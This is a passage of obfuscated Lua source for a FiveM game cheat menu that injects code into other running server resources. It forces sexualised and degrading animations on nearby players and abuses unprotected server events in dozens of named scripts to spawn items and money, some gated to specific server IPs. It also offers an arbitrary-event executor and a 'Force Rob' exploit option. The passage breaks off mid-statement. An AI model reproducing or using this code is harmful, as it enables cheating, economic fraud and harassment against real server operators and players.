                        TaskPlayAnim(PlayerPedId(), "anim@arena@celeb@flat@paired@no_props@", "piggyback_c_player_b", 8.0, -8.0, 1000000, 33, 0, false, false, false)
                    end
                end
            end

            RtKpqLmXZV()
        ]]);end);MachoMenuButton(v44[1 + 0 ],"Blame Arrest",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function WXY7LpqKto()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if closestPlayer then
                    if StarkCuff then
                        ClearPedSecondaryTask(playerPed)
                        DetachEntity(playerPed, true, false)
                        StarkCuff = false
                    else
                        StarkCuff = true
                        if not HasAnimDictLoaded("mp_arresting") then
                            RequestAnimDict("mp_arresting")
                            while not HasAnimDictLoaded("mp_arresting") do
                                Wait(0)
                            end
                        end

                        local targetPed = GetPlayerPed(closestPlayer)
                        AttachEntityToEntity(PlayerPedId(), targetPed, 4103, 0.35, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                        TaskPlayAnim(PlayerPedId(), "mp_arresting", "idle", 8.0, -8, -1, 49, 0.0, false, false, false)
                    end
                end
            end

            WXY7LpqKto()
        ]]);end);MachoMenuButton(v44[1],"Blame Carry",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function KmXYpTzqLW()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if closestPlayer then
                    if StarkCarry then
                        ClearPedSecondaryTask(playerPed)
                        DetachEntity(playerPed, true, false)
                        StarkCarry = false
                    else
                        StarkCarry = true
                        if not HasAnimDictLoaded("nm") then
                            RequestAnimDict("nm")
                            while not HasAnimDictLoaded("nm") do
                                Wait(0)
                            end
                        end

                        local targetPed = GetPlayerPed(closestPlayer)
                        AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.35, 0.08, 0.63, 0.5, 0.5, 180, false, false, false, false, 2, false)
                        TaskPlayAnim(PlayerPedId(), "nm", "firemans_carry", 8.0, -8.0, 100000, 33, 0, false, false, false)
                    end
                end
            end

            KmXYpTzqLW()
        ]]);end);MachoMenuButton(v44[1 + 0 ],"Sit On Them",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function PxKvqLtNYz()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if not HasAnimDictLoaded("anim@heists@prison_heistunfinished_biztarget_idle") then
                    RequestAnimDict("anim@heists@prison_heistunfinished_biztarget_idle")
                    while not HasAnimDictLoaded("anim@heists@prison_heistunfinished_biztarget_idle") do
                        Wait(0)
                    end
                end

                AttachEntityToEntity(PlayerPedId(), GetPlayerPed(closestPlayer), 4103, 0.10, 0.28, 1.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                TaskPlayAnim(PlayerPedId(), "anim@heists@prison_heistunfinished_biztarget_idle", "target_idle", 8.0, -8.0, 9999999, 33, 9999999, false, false, false)
                TaskSetBlockingOfNonTemporaryEvents(PlayerPedId(), true)
            end

            PxKvqLtNYz()
        ]]);end);MachoMenuButton(v44[3 -2 ],"Ride Driver",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function vZqPWLXm97()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if closestPlayer then
                    if RideDriver then
                        ClearPedSecondaryTask(playerPed)
                        DetachEntity(playerPed, true, false)
                        RideDriver = false
                    else
                        RideDriver = true
                        if not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") then
                            RequestAnimDict("mini@prostitutes@sexnorm_veh")
                            while not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") do
                                Wait(0)
                            end
                        end

                        local targetPed = GetPlayerPed(closestPlayer)
                        AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.35, 0.08, 0.63, 0.5, 0.5, 180, false, false, false, false, 2, false)
                        TaskPlayAnim(PlayerPedId(), "mini@prostitutes@sexnorm_veh", "sex_loop_prostitute", 8.0, -8.0, 100000, 33, 0, false, false, false)
                    end
                end
            end

            vZqPWLXm97()
        ]]);end);MachoMenuButton(v44[1],"Blow Driver",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function qPLWtXYzKm()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if closestPlayer then
                    if BlowDriver then
                        ClearPedSecondaryTask(playerPed)
                        DetachEntity(playerPed, true, false)
                        BlowDriver = false
                    else
                        BlowDriver = true
                        if not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") then
                            RequestAnimDict("mini@prostitutes@sexnorm_veh")
                            while not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") do
                                Wait(0)
                            end
                        end

                        TaskPlayAnim(PlayerPedId(), "mini@prostitutes@sexnorm_veh", "bj_loop_prostitute", 8.0, -8.0, 100000, 33, 0, false, false, false)
                    end
                end
            end

            qPLWtXYzKm()
        ]]);end);MachoMenuButton(v44[1],"Meditate On Them",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function XYqLvTzWKo()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if not HasAnimDictLoaded("rcmcollect_paperleadinout@") then
                    RequestAnimDict("rcmcollect_paperleadinout@")
                    while not HasAnimDictLoaded("rcmcollect_paperleadinout@") do
                        Wait(0)
                    end
                end

                AttachEntityToEntity(PlayerPedId(), GetPlayerPed(closestPlayer), 57005, 0, -0.12, 1.53, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                TaskPlayAnim(PlayerPedId(), "rcmcollect_paperleadinout", "meditiate_idle", 8.0, -8.0, 9999999, 33, 9999999, false, false, false)
                TaskSetBlockingOfNonTemporaryEvents(PlayerPedId(), true)
            end

            XYqLvTzWKo()
        ]]);end);local v58=0;local v59=false;local v60=nil;local v61={[605 -(316 + 289) ]="slapped",[2 -1 ]="punched",[2]="receiveblowjob",[3]="GiveBlowjob",[1 + 3 ]="headbutted",[1458 -(666 + 787) ]="hug4",[6]="streetsexfemale",[432 -(360 + 65) ]="streetsexmale",[8 + 0 ]="pback2",[9]="carry3",[264 -(79 + 175) ]=".....gta298",[17 -6 ]=".....gta304",[10 + 2 ]=".....gta284"};MachoMenuDropDown(v44[5 -3 ],"Emote Choice",function(v212) v58=v212;end,"Slapped","Punched","Give BJ","Recieve BJ","Headbutt","Hug","StreetSexFemale","StreetSexMale","Piggyback","Carry","Butt Rape","Amazing Head","Lesbian Scissors");MachoMenuButton(v44[3 -1 ],"Give Emote",function() local v213=899 -(503 + 396) ;local v214;while true do if (v213==(181 -(92 + 89))) then v214=v61[v58];if v214 then MachoInjectResource2(3,(v48("monitor") and "monitor") or "any" ,string.format([[
                local function KmTpqXYzLv()
                    local Rk3uVnTZpxf7Q = TriggerEvent
                    Rk3uVnTZpxf7Q("ClientEmoteRequestReceive", "%s", true)
                end

                KmTpqXYzLv()
            ]],v214));end break;end end end);InputBoxHandle=MachoMenuInputbox(v45[1 -0 ],"Name:","...");InputBoxHandle2=MachoMenuInputbox(v45[1 + 0 ],"Amount:","...");MachoMenuButton(v45[1 + 0 ],"Spawn",function() local v215=MachoMenuGetInputbox(InputBoxHandle);local v216=MachoMenuGetInputbox(InputBoxHandle2);if (v215 and (v215~="") and v216 and tonumber(v216)) then local v289=tonumber(v216);local v290={ak47_drugmanager=function() MachoInjectResource2(11 -8 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function efjwr8sfr()
                            TriggerServerEvent('ak47_drugmanager:pickedupitem', "]]   .. v215   .. [[", "]]   .. v215   .. [[", ]]   .. v216   .. [[)
                        end

                        efjwr8sfr()
                    ]] );end,["bobi-selldrugs"]=function() MachoInjectResource2(1 + 2 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function safdagwawe()
                            TriggerServerEvent('bobi-selldrugs:server:RetrieveDrugs', "]]   .. v215   .. [[", ]]   .. v216   .. [[)
                        end

                        safdagwawe()
                    ]] );end,["mc9-taco"]=function() MachoInjectResource2(6 -3 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function cesfw33w245d()
                            TriggerServerEvent('mc9-taco:server:addItem', "]]   .. v215   .. [[", ]]   .. v216   .. [[)
                        end

                        cesfw33w245d()
                    ]] );end,["bobi-selldrugs"]=function() MachoInjectResource2(3 + 0 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function safdagwawe()
                            TriggerServerEvent('bobi-selldrugs:server:RetrieveDrugs', "]]   .. v215   .. [[", ]]   .. v216   .. [[)
                        end

                        safdagwawe()
                    ]] );end,["wp-pocketbikes"]=function() MachoInjectResource2(2 + 1 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function awdfaweawewaeawe()
                            TriggerServerEvent("wp-pocketbikes:server:AddItem", "]]   .. v215   .. [[", ]]   .. v216   .. [[)
                        end

                        awdfaweawewaeawe()
                    ]] );end,["solos-jointroll"]=function() MachoInjectResource2(8 -5 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function weawasfawfasfa()
                            TriggerServerEvent('solos-joints:server:itemadd', "]]   .. v215   .. [[", ]]   .. v216   .. [[)
                        end

                        weawasfawfasfa()
                    ]] );end,["angelicxs-CivilianJobs"]=function() MachoInjectResource2(1 + 2 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function safafawfaws()
                            TriggerServerEvent('angelicxs-CivilianJobs:Server:GainItem', "]]   .. v215   .. [[", ]]   .. v216   .. [[)
                        end

                        safafawfaws()
                    ]] );end,ars_whitewidow_v2=function() MachoInjectResource2(4 -1 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function sDfjMawT34()
                            TriggerServerEvent('ars_whitewidow_v2:Buyitem', {
                                items = {
                                    {
                                        id = "]]   .. v215   .. [[",
                                        image = "JTG",
                                        name = "JTG",
                                        page = 1,
                                        price = 500,
                                        quantity = ]]   .. v216   .. [[,
                                        stock = 999999999999999999999999999,
                                        totalPrice = 0
                                    }
                                },
                                method = "cash",
                                total = 0
                            }, "cash")
                        end

                        sDfjMawT34()
                    ]] );end,ars_cannabisstore_v2=function() MachoInjectResource2(1247 -(485 + 759) ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                    local function sDfjMawT34()
                        TriggerServerEvent("ars_cannabisstore_v2:Buyitem", {
                            items = {
                                {
                                    id = "]]   .. v215   .. [[",
                                    image = "JTG",
                                    name = "JTG",
                                    page = JTG,
                                    price = 0,
                                    quantity = ]]   .. v216   .. [[,
                                    stock = 10000000000000,
                                    totalPrice = 0
                                }
                            },
                            method = "JTG",
                            total = 0
                        }, "cash")
                    end

                    sDfjMawT34()
                    ]] );end,ars_hunting=function() MachoInjectResource2(6 -3 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function sDfjMawT34()
                            TriggerServerEvent("ars_hunting:sellBuyItem",  {
                                item = "]]   .. v215   .. [[",
                                price = 1,
                                quantity = ]]   .. v216   .. [[,
                                buy = true
                            })
                        end

                        sDfjMawT34()
                    ]] );end,["boii-whitewidow"]=function() local v300=1189 -(442 + 747) ;local v301;local v302;local v303;while true do if (v300==(1136 -(832 + 303))) then function v302(v387) local v388=0;while true do if (v388==(946 -(88 + 858))) then for v429,v430 in ipairs(v301) do if (v387==v430) then return true;end end return false;end end end v303=GetCurrentServerEndpoint();v300=1 + 1 ;end if (v300==(2 + 0)) then if v302(v303) then MachoInjectResource2(1 + 2 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                            local function sDfjMawT34()
                                TriggerServerEvent('boii-whitewidow:server:AddItem', ']]   .. v215   .. [[', ]]   .. v216   .. [[)
                            end

                            sDfjMawT34()
                        ]] );end break;end if (v300==(789 -(766 + 23))) then v301={"217.20.242.24:30120"};v302=nil;v300=4 -3 ;end end end,["codewave-cannabis-cafe"]=function() local v304=0 -0 ;local v305;local v306;local v307;while true do if (v304==(0 -0)) then v305={"185.244.106.45:30120"};v306=nil;v304=3 -2 ;end if (v304==(1075 -(1036 + 37))) then if v306(v307) then MachoInjectResource2(3,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                            local function sDfjMawT34()
                                TriggerServerEvent("cannabis_cafe:giveStockItems", { item = "]]   .. v215   .. [[", newItem = "JTG", pricePerItem = 0 }, ]]   .. v216   .. [[)
                            end

                            sDfjMawT34()
                        ]] );end break;end if (v304==(1 + 0)) then function v306(v389) local v390=0 -0 ;while true do if (v390==(0 + 0)) then for v431,v432 in ipairs(v305) do if (v389==v432) then return true;end end return false;end end end v307=GetCurrentServerEndpoint();v304=1482 -(641 + 839) ;end end end,["snipe-boombox"]=function() MachoInjectResource2(916 -(910 + 3) ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function sDfjMawT34()
                            TriggerServerEvent("snipe-boombox:server:pickup", ]]   .. v216   .. [[, vector3(0.0, 0.0, 0.0), "]]   .. v215   .. [[")
                        end

                        sDfjMawT34()
                    ]] );end,devkit_bbq=function() MachoInjectResource2(7 -4 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function sDfjMawT34()
                            TriggerServerEvent('devkit_bbq:addinv', ']]   .. v215   .. [[', ]]   .. v216   .. [[)
                        end

                        sDfjMawT34()
                    ]] );end,mt_printers=function() MachoInjectResource2(1687 -(1466 + 218) ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[  
                        local function sDfjMawT34()
                            TriggerServerEvent('__ox_cb_mt_printers:server:itemActions', "mt_printers", "mt_printers:server:itemActions:JTG", "]]   .. v215   .. [[", "add")
                        end

                        sDfjMawT34()
                    ]] );end,WayTooCerti_3D_Printer=function() MachoInjectResource2(2 + 1 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[ 
                        local function ZxUwQsErTy12()
                            TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', ']]   .. v215   .. [[', ]]   .. v216   .. [[)
                        end
                        ZxUwQsErTy12()
                    ]] );end,["pug-fishing"]=function() MachoInjectResource2(1151 -(556 + 592) ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function MnBvCxZlKjHgFd23()
                            TriggerServerEvent('Pug:server:GiveFish', "]]   .. v215   .. [[", ]]   .. v216   .. [[)
                        end
                        MnBvCxZlKjHgFd23()
                    ]] );end,apex_koi=function() MachoInjectResource2(2 + 1 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function ErTyUiOpAsDfGh45()
                            TriggerServerEvent("apex_koi:client:addItem", "]]   .. v215   .. [[", ]]   .. v216   .. [[)
                        end
                        ErTyUiOpAsDfGh45()
                    ]] );end,apex_peckerwood=function() MachoInjectResource2(811 -(329 + 479) ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function UiOpAsDfGhJkLz67()
                            TriggerServerEvent("apex_peckerwood:client:addItem", "]]   .. v215   .. [[", ]]   .. v216   .. [[)
                        end
                        UiOpAsDfGhJkLz67()
                    ]] );end,apex_thetown=function() MachoInjectResource2(857 -(174 + 680) ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function PlMnBvCxZaSdFg89()
                            TriggerServerEvent("apex_thetown:client:addItem", "]]   .. v215   .. [[", ]]   .. v216   .. [[)
                        end
                        PlMnBvCxZaSdFg89()
                    ]] );end,["codewave-bbq"]=function() MachoInjectResource2(10 -7 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function QwErTyUiOpAsDf90()
                            for i = 1, ]]   .. v216   .. [[ do
                                TriggerServerEvent('placeProp:returnItem', "]]   .. v215   .. [[")
                                Wait(1)
                            end
                        end
                        QwErTyUiOpAsDf90()
                    ]] );end,brutal_hunting=function() MachoInjectResource2(5 -2 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function TyUiOpAsDfGhJk01()
                            Wait(1)
                            TriggerServerEvent("brutal_hunting:server:AddItem", {
                                {
                                    amount = "]]   .. v216   .. [[",
                                    item = "]]   .. v215   .. [[",
                                    label = "J",
                                    price = 0
                                }
                            })
                        end
                        TyUiOpAsDfGhJk01()
                    ]] );end,xmmx_bahamas=function() MachoInjectResource2(3 + 0 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function JkLzXcVbNmQwEr02()
                            TriggerServerEvent("xmmx-bahamas:Making:GetItem", "]]   .. v215   .. [[", {
                                amount = ]]   .. v216   .. [[,
                                cash = {
                                }
                            })
                        end
                        JkLzXcVbNmQwEr02()
                    ]] );end,ak47_drugmanager=function() local v308=739 -(396 + 343) ;local v309;local v310;local v311;while true do if (v308==(0 + 0)) then v309={"162.222.16.18:30120"};v310=nil;v308=1478 -(29 + 1448) ;end if (v308==1) then function v310(v391) for v402,v403 in ipairs(v309) do if (v391==v403) then return true;end end return false;end v311=GetCurrentServerEndpoint();v308=1391 -(135 + 1254) ;end if (v308==(7 -5)) then if v310(v311) then MachoInjectResource2(3,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                            local function aKf48SlWd()
                                Wait(1)
                                TriggerServerEvent('ak47_drugmanager:pickedupitem', "]]   .. v215   .. [[", "]]   .. v215   .. [[", ]]   .. v216   .. [[)
                            end
                            aKf48SlWd()
                        ]] );end break;end end end,xmmx_letscookplus=function() MachoInjectResource2(13 -10 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function QwErTy123()
                            Wait(1)
                            TriggerServerEvent('xmmx_letscookplus:server:BuyItems', {
                                totalCost = 0,
                                cart = {
                                    {name = "]]   .. v215   .. [[", quantity = ]]   .. v216   .. [[}
                                }
                            }, "bank")
                        end
                        QwErTy123()
                    ]] );end,["xmmx-letscamp"]=function() local v312=0;local v313;local v314;local v315;while true do if (v312==(0 + 0)) then v313={"66.70.153.70:80"};v314=nil;v312=1;end if (v312==(1528 -(389 + 1138))) then function v314(v392) local v393=574 -(102 + 472) ;while true do if (v393==(0 + 0)) then for v433,v434 in ipairs(v313) do if (v392==v434) then return true;end end return false;end end end v315=GetCurrentServerEndpoint();v312=2 + 0 ;end if ((2 + 0)==v312) then if  not v314(v315) then local v404=1545 -(320 + 1225) ;local v405;while true do if (v404==(0 -0)) then v405=string.format([[ 
                            local function XcVbNm82()
                                Wait(1)
                                TriggerServerEvent('xmmx-letscamp:Cooking:GetItem', ']]   .. v215   .. [[', {
                                    ["%s"] = {
                                        ['lccampherbs'] = 0,
                                        ['lccampmeat'] = 0,
                                        ['lccampbutta'] = 0
                                    },
                                    ['amount'] = ]]   .. v216   .. [[
                                })
                            end
                            XcVbNm82()
                        ]] ,v215);MachoInjectResource2(2 + 1 ,"xmmx-letscamp",v405);break;end end end break;end end end,wasabi_mining=function() MachoInjectResource2(1467 -(157 + 1307) ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function MzXnJqKs88()
                            local item = {
                                difficulty = { "medium", "medium" },
                                item = "]]   .. v215   .. [[",
                                label = "JTG",
                                price = { 110, 140 }
                            }

                            local index = 3
                            local amount = ]]   .. v216   .. [[

                            for i = 1, amount do
                                Wait(1)
                                TriggerServerEvent('wasabi_mining:mineRock', item, index)
                            end
                        end
                        MzXnJqKs88()
                    ]] );end,apex_bahama=function() local v316=1859 -(821 + 1038) ;local v317;local v318;local v319;while true do if (v316==(2 -1)) then function v318(v394) local v395=0 + 0 ;while true do if (v395==(0 -0)) then for v435,v436 in ipairs(v317) do if (v394==v436) then return true;end end return false;end end end v319=GetCurrentServerEndpoint();v316=1 + 1 ;end if (v316==0) then v317={"89.31.216.161:30120"};v318=nil;v316=1027 -(834 + 192) ;end if (v316==2) then if v318(v319) then MachoInjectResource2(1 + 2 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                            local function PlMnBv55()
                                Wait(1)
                                TriggerServerEvent("apex_bahama:client:addItem", "]]   .. v215   .. [[", ]]   .. v216   .. [[)
                            end
                            PlMnBv55()
                        ]] );end break;end end end,["jg-mechanic"]=function() local v320={"91.190.154.43:30120"};local function v321(v349) for v366,v367 in ipairs(v320) do if (v349==v367) then return true;end end return false;end local v322=GetCurrentServerEndpoint();if v321(v322) then MachoInjectResource2(1 + 2 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                            local function HjKlYu89()
                                Wait(1)
                                TriggerServerEvent('jg-mechanic:server:buy-item', "]]   .. v215   .. [[", 0, ]]   .. v216   .. [[, "autoexotic", 1)
                            end
                            HjKlYu89()
                        ]] );end end,["jg-mechanic"]=function() local v323=0 + 0 ;local v324;local v325;local v326;while true do if (v323==(1 -0)) then function v325(v396) local v397=304 -(300 + 4) ;while true do if (v397==(0 + 0)) then for v437,v438 in ipairs(v324) do if (v396==v438) then return true;end end return false;end end end v326=GetCurrentServerEndpoint();v323=2;end if (v323==(0 -0)) then v324={"191.96.152.17:30121"};v325=nil;v323=1;end if (v323==(364 -(112 + 250))) then if v325(v326) then MachoInjectResource2(2 + 1 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                            local function LkJfQwOp78()
                                Wait(1)
                                TriggerServerEvent('jg-mechanic:server:buy-item', "]]   .. v215   .. [[", 0, ]]   .. v216   .. [[, "TheCultMechShop", 1)
                            end
                            LkJfQwOp78()
                        ]] );end break;end end end};local v291=false;for v327,v328 in pairs(v290) do if (GetResourceState(v327)=="started") then v328();v291=true;break;end end if  not v291 then MachoMenuNotification("[NOTIFICATION] JTG Menu","No Triggers Found.");end else MachoMenuNotification("[NOTIFICATION] JTG Menu","Invalid Item or Amount.");end end);MoneyInputBox=MachoMenuInputbox(v45[4 -2 ],"Amount:","...");MachoMenuButton(v45[2 + 0 ],"Spawn Money",function() local v217=MachoMenuGetInputbox(MoneyInputBox);if (v217 and tonumber(v217)) then local v292=0 + 0 ;local v293;local v294;local v295;while true do if (v292==2) then if  not v295 then MachoMenuNotification("[NOTIFICATION] WizeMenu","No Triggers Found.");end break;end if (v292==(0 + 0)) then v293=tonumber(v217);v294={["codewave-lashes-phone"]=function() MachoInjectResource2(2 + 1 ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardlashes', ]]   .. v293   .. [[)
                ]] );end,["codewave-nails-phone"]=function() MachoInjectResource2(3 + 0 ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardnails', ]]   .. v293   .. [[)
                ]] );end,["codewave-caps-client-phone"]=function() MachoInjectResource2(3,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardCaps', ]]   .. v293   .. [[)
                ]] );end,["codewave-wigs-v3-phone"]=function() MachoInjectResource2(3,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardWigss', ]]   .. v293   .. [[)
                ]] );end,["codewave-icebox-phone"]=function() MachoInjectResource2(1417 -(1001 + 413) ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardiceboxs', ]]   .. v293   .. [[)
                ]] );end,["codewave-sneaker-phone"]=function() MachoInjectResource2(6 -3 ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardShoes', ]]   .. v293   .. [[)
                ]] );end,["codewave-handbag-phone"]=function() MachoInjectResource2(885 -(244 + 638) ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardhandbags', ]]   .. v293   .. [[)
                ]] );end};v292=694 -(627 + 66) ;end if (v292==1) then v295=false;for v375,v376 in pairs(v294) do if (GetResourceState(v375)=="started") then v376();v295=true;break;end end v292=5 -3 ;end end else MachoMenuNotification("[NOTIFICATION] WizeMenu","Invalid Item or Amount.");end end);local v62=MachoMenuInputbox(v45[606 -(512 + 90) ],"Event:","...");local v63=MachoMenuInputbox(v45[1910 -(1665 + 241) ],"Type:","...");local v64=MachoMenuInputbox(v45[721 -(373 + 344) ],"Resource:","...");local v65={"monitor","any"};MachoMenuButton(v45[10 -6 ],"Execute",function() local v218=0 -0 ;local v219;local v220;local v221;local v222;local v223;local v224;local v225;local v226;local v227;local v228;local v229;local v230;local v231;local v232;local v233;while true do if (v218==(1101 -(35 + 1064))) then v224,v225=pcall(v222);if ( not v224 or (type(v225)~="function")) then return;end v226={pcall(v225)};v218=3;end if (v218==(0 -0)) then v219=MachoMenuGetInputbox(v62);v220=MachoMenuGetInputbox(v63);v221=MachoMenuGetInputbox(v64);v218=1 + 0 ;end if ((1242 -(298 + 938))==v218) then v232=string.format([[
            local event = %q
            local triggerType = string.lower(%q)
            local args = { %s }

            if triggerType == "server" then
                TriggerServerEvent(event, table.unpack(args))
            else
                TriggerEvent(event, table.unpack(args))
            end
        ]],tostring(v227),string.lower(v220 or "client" ),v231);v233=nil;if (v221 and (v221~="")) then if (GetResourceState(v221)=="started") then v233=v221;end else for v377,v378 in ipairs(v65) do if (GetResourceState(v378)=="started") then v233=v378;break;end end end v218=7;end if (v218==(1260 -(233 + 1026))) then if ( not v219 or (v219=="")) then return;end v222,v223=load("return function() return "   .. v219   .. " end" );if  not v222 then return;end v218=1668 -(636 + 1030) ;end if (v218==7) then if v233 then MachoInjectResource(v233,v232);end break;end if (v218==5) then v230={};for v350,v351 in ipairs(v228) do table.insert(v230,v229(v351));end v231=(( #v230>0) and table.concat(v230,", ")) or "" ;v218=4 + 2 ;end if (v218==4) then for v352=3 + 0 , #v226 do table.insert(v228,v226[v352]);end v229=nil;function v229(v353) if (type(v353)=="string") then return string.format("%q",v353);elseif ((type(v353)=="number") or (type(v353)=="boolean")) then return tostring(v353);elseif (type(v353)=="table") then local v425=0 + 0 ;local v426;local v427;while true do if (v425==0) then v426,v427=pcall(function() return json.encode(v353);end);return (v426 and string.format("json.decode(%q)",v427)) or "nil" ;end end else return "nil";end end v218=1 + 4 ;end if (v218==(224 -(55 + 166))) then if  not v226[1 + 0 ] then return;end v227=v226[1 + 1 ];v228={};v218=15 -11 ;end end end);local v66=297 -(36 + 261) ;local v67={[0 -0 ]={name="[E] Force Rob",resource=nil,code=nil}};MachoMenuDropDown(v45[3],"Exploit Choice",function(v234) v66=v234;end,v67[1368 -(34 + 1334) ].name);MachoMenuButton(v45[3],"Execute",function() local v235=0;local v236;while true do if (v235==1) then if (v66==(0 + 0)) then local v368=0 + 0 ;local v369;local v370;local v371;while true do if (v368==(1285 -(1035 + 248))) then for v416,v417 in ipairs(v370 or {} ) do if 